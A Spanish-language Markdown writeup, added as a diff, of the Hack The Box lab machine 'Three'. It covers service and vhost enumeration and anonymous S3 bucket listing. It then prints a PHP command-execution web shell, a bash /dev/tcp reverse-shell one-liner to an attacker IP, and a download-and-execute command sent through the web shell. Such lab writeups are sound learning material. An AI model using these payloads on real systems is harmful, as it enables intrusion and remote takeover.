@@ -1,0 +1,182 @@
+---
+title: "HTB — Three: Writeup inicial (10.129.37.123)"
+description: "Objetivo"
+date: "2026-03-27"
+tags:
+  - writeup
+  - learning
+tools:
+  []
+---
+# HTB — Three: Writeup inicial (10.129.37.123)
+
+Objetivo
+- Primera toma de contacto: detección de servicios, enumeración web y comprobación de vectores Windows (SMB/WinRM/RDP).
+
+Notas rápidas
+- Host: `three`
+- IP: `10.129.37.123`
+- Propósito: crear una checklist reproducible para empezar la máquina Three.
+
+1) Nmap básico y reconocimiento rápido
+```bash
+# TCP top-1000 + versión + scripts básicos
+sudo nmap -T4 -sC -sV -oN writeups/Three_nmap_quick.txt 10.129.37.123
+# Full TCP scan (más lento)
+sudo nmap -T4 -p- -oA writeups/Three_nmap_full 10.129.37.123
+```
+
+2) Escaneo servicios Windows específicos (si aparecen)
+```bash
+# RPC/SMB/WinRM/RDP focused
+sudo nmap -p 135,139,445,3389,5985,5986 -sV --script smb-os-discovery,smb-enum-shares,smb-vuln* 10.129.37.123 -oN writeups/Three_nmap_windows.txt
+```
+
+3) Enumeración web
+```bash
+# si hay web en el host (http/https)
+curl -I http://10.129.37.123
+curl -L http://10.129.37.123 | sed -n '1,200p'
+# dirb/gobuster
+gobuster dir -u http://10.129.37.123 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -o writeups/Three_gobuster.txt
+```
+
+4) WinRM quick-check
+```bash
+# comprobar puertos
+nc -vz 10.129.37.123 5985
+nc -vz 10.129.37.123 5986
+# probar con credenciales si las tienes
+# evil-winrm -i 10.129.37.123 -u <user> -p <pass>
+```
+
+5) SMB quick-check
+```bash
+smbclient -L \\10.129.37.123 -N
+enum4linux -a 10.129.37.123 > writeups/Three_enum4linux.txt
+```
+
+6) Extras y herramientas
+- `nikto` para web.
+- `searchsploit` para buscar exploits por servicio/version.
+- `ffuf` para fuzzing de parámetros en aplicaciones web.
+
+7) Registro y artefactos
+- Crear carpeta: `writeups/Three/downloads/` para archivos obtenidos.
+- Guardar todos los outputs `writeups/Three_*`.
+
+8) Checklist de objetivo (marca cuando lo completes)
+- [ ] `nmap` quick scan
+- [ ] `nmap` full scan
+- [ ] Gobuster / dir enumeration
+- [ ] SMB enumeration (shares, users)
+- [ ] WinRM check
+- [ ] Buscar LFI/RFI si hay web
+- [ ] Intentar creds/relay/crack si hay capturas
+
+Siguientes pasos sugeridos
+- Ejecuta el `nmap` quick y pega aquí los resultados; incorporo los hallazgos al writeup y te propongo vectores prioritarios.
+
+Archivo: `writeups/Three_WRITEUP.md` (inicial).
+
+VHOST / Subdomain enumeration (experimentos con Amass + Gobuster)
+
+- Intentos realizados:
+	- `amass enum -passive -d thetoppers.htb -o results/amass_passive.txt`
+	- `amass enum -brute -d thetoppers.htb -o results/amass_brute.txt`
+
+- Observaciones sobre Amass:
+	- Amass en modo pasivo depende de fuentes OSINT/DNS/CRT. En entornos cerrados (HTB/labs) suele devolver pocos o ningún resultado si no hay trazas públicas.
+	- Por eso, Amass puede no listar vhosts internos que existen solo en la configuración del servidor.
+
+- Uso de `gobuster vhost` y hallazgo práctico:
+	- Comando utilizado (ejemplo):
+		```bash
+		gobuster vhost --append-domain -u http://thetoppers.htb -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 10 -o results/gob_vhost.txt
+		```
+	- Resultado: `gobuster` detectó `s3.thetoppers.htb` como vhost válido (apareció como "Found" en la salida). Este hallazgo permitió acceder a recursos relacionados con S3/almacenamiento en el host objetivo.
+
+- Por qué sucedió esto:
+	- `gobuster vhost` prueba el header `Host` y detecta respuestas distintas del servidor aunque el nombre no exista en DNS. Amass no detectó `s3` porque no había rastro público en las fuentes pasivas.
+
+- Validación recomendada tras un hit de vhost:
+	- Comprobar cabeceras y status:
+		```bash
+		curl -I -H "Host: s3.thetoppers.htb" http://thetoppers.htb
+		```
+	- Si se confirma, añadir temporalmente a `/etc/hosts` para navegación:
+		```bash
+		echo "10.129.37.123 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+		```
+
+- Conclusión:
+	- Combinar Amass (OSINT) con `gobuster vhost` (comportamiento de servidor) ofrece mayor cobertura. En este caso, los comandos y wordlists empleados llevaron al descubrimiento de `s3`, que es un camino prometedor para seguir la enumeración de recursos.
+
+---
+
+**Playthrough detallado (pasos que seguí y por qué)**
+
+1) Descubrimiento del vhost `s3`
+- Herramienta: `gobuster vhost` probando valores en el header `Host`.
+- Comando ejemplo usado: `gobuster vhost --append-domain -u http://thetoppers.htb -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 10 -o results/gob_vhost.txt`
+- Por qué: algunos servidores responden distinto según el header `Host` (vhosts) aunque el nombre no exista en DNS. `gobuster` detectó `s3.thetoppers.htb`.
+
+2) Comprobar y listar el bucket S3 (anónimo)
+- Herramienta: `awscli` con `--endpoint-url` y `--no-sign-request` para accesos sin credenciales.
+- Comando usado:
+	- `aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-request`
+- Resultado: listó objetos: `.htaccess`, `index.php`, `shell.php`, `test.php`, y una carpeta `images/`.
+
+3) Entender la diferencia entre S3 object y ejecución PHP
+- Observación inicial: acceder a `http://s3.thetoppers.htb/thetoppers.htb/shell.php` devolvía el contenido del objeto (el código PHP), porque eso es el endpoint S3 que devuelve objetos, no un servidor web que ejecute PHP.
+- Acceder a `http://thetoppers.htb/shell.php` (Host=thetoppers.htb) es distinto: eso llega al servidor web (Apache) que sí puede interpretar/ejecutar PHP.
+
+4) Verificar ejecución PHP
+- Subí `test.php` con `<?php echo "HELLO"; ?>` y lo probé:
+	- `curl --resolve thetoppers.htb:80:10.129.59.197 "http://thetoppers.htb/test.php"` → devolvió `HELLO` y `HTTP/1.1 200 OK`.
+- Probé `shell.php` con `<?php system($_GET['cmd']); ?>`:
+	- `curl --resolve thetoppers.htb:80:10.129.59.197 "http://thetoppers.htb/shell.php?cmd=id"` → devolvió `uid=33(www-data)...`.
+- Conclusión: el servidor ejecuta PHP y `system()` funciona en este contexto.
+
+5) Preparar reverse shell (problema de conectividad y solución)
+- Objetivo: abrir una reverse shell desde el servidor al atacante.
+- Pasos realizados:
+	1. En la máquina atacante (tun0 = `10.10.17.188`) preparé un archivo `rev.sh` con el one-liner de bash: `bash -i >& /dev/tcp/10.10.17.188/4444 0>&1`.
+	2. Serví `rev.sh` con `python3 -m http.server 8000` y puse `nc -lvnp 4444` como listener.
+	3. Desde el web-shell pedí al servidor que descargara y ejecutara el script:
+		 - `curl --resolve thetoppers.htb:80:10.129.59.197 "http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.17.188:8000/rev.sh%20-o%20/tmp/rev.sh%3Bchmod%20%2Bx%20/tmp/rev.sh%3B/tmp/rev.sh"`
+- Qué ocurrió y por qué funcionó:
+	- El servidor hizo un GET a `http://10.10.17.188:8000/rev.sh` (se vio en el http.server logs) y luego estableció una conexión TCP al listener; el `nc` en la máquina atacante registró `Connection received` y quedó un shell como `www-data`.
+	- No fue necesario subir `rev.sh` al bucket: usamos el web-shell en `thetoppers.htb` (ejecutado por Apache) para instruir al target a descargar el script desde nuestra máquina y ejecutarlo localmente.
+
+6) Por qué algunas variantes no funcionaron inicialmente
+- Acceso por path-style a S3 devolvía XML `NoSuchBucket` o el código fuente PHP: eso es normal porque el endpoint S3 interpreta las rutas como bucket/object, no ejecuta código.
+- Intentos directos de `nc -e` o one-liners pueden fallar si `nc` no tiene `-e`, o si el target no tiene `bash`/`python`/`nc`. Por eso la técnica de "descargar y ejecutar" desde un servidor controlado es más fiable.
+- Conectividad: si al servidor le bloquean puertos salientes, las peticiones a tu HTTP server o al puerto del listener no llegarán; siempre probar primero con una petición HTTP simple (ej. descargar `/test.txt`) para validar que el target puede alcanzar tu servicio.
+
+7) Estabilizar la shell y comprobar archivos
+- Tras recibir la conexión se observó el aviso `bash: cannot set terminal process group...` — esto es normal en reverse shells sin TTY. Para estabilizar:
+	- En la sesión del listener ejecutar: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+	- `export TERM=xterm` y luego `Ctrl+Z`, `stty raw -echo; fg`, y `reset` según sea necesario.
+- Usé `cd ..` varias veces y encontré `flag.txt` en `/var/www` y lo leí.
+
+8) Comandos clave empleados (resumen)
+- Enumeración vhost: `gobuster vhost --append-domain -u http://thetoppers.htb -w WORDLIST -t 10 -o results/gob_vhost.txt`
+- Listar bucket S3 anónimo: `aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-request`
+- Acceder a archivo como web (Host virtual): `curl --resolve thetoppers.htb:80:10.129.59.197 "http://thetoppers.htb/shell.php?cmd=id"`
+- Servir reverse: `echo 'bash -i >& /dev/tcp/10.10.17.188/4444 0>&1' > rev.sh && python3 -m http.server 8000`
+- Descargar+ejecutar desde target vía web-shell:
+	- `curl --resolve thetoppers.htb:80:10.129.59.197 "http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.17.188:8000/rev.sh%20-o%20/tmp/rev.sh%3Bchmod%20%2Bx%20/tmp/rev.sh%3B/tmp/rev.sh"`
+
+9) Lecciones aprendidas
+- Diferencia S3 vs webserver: S3 devuelve objetos; el servidor web (vhost) puede ejecutar código. Saber cuál endpoint atiende la petición es crucial.
+- `--resolve` y `Host` headers permiten probar vhosts sin DNS.
+- La técnica "download+execute" es robusta cuando falta `nc -e` o hay shell limitados.
+- Siempre comprobar conectividad saliente desde el target antes de intentar reverse shells.
+
+10) Resultado final
+- Conseguí una shell como `www-data`, estabilicé el TTY y leí `flag.txt` en `/var/www`.
+
+---
+
+Si quieres, formateo esto como un writeup final pulido para publicar (con comandos listos para copiar y una sección de mitigaciones/recursos). ¿Lo dejo así o lo dejo más resumido para publicar?
